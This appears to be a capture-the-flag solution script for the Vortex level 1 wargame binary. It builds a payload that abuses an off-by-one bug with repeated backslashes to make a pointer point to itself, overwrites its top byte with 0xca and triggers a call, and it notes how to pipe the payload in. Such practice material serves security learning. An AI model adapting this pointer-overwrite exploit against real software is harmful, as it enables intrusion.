exp  = '\\'*257   # make ptr point to itself, they have an off by one error in the last check in the while loop
exp += '\xca'     # overwrite ptr most significant byte
exp += 'a'        # some random letter to trigger the call to e()

# VERY IMPORTANT: run with (python sol.py ; cat) | /vortex/vortex1 because of bash EOF and stuff

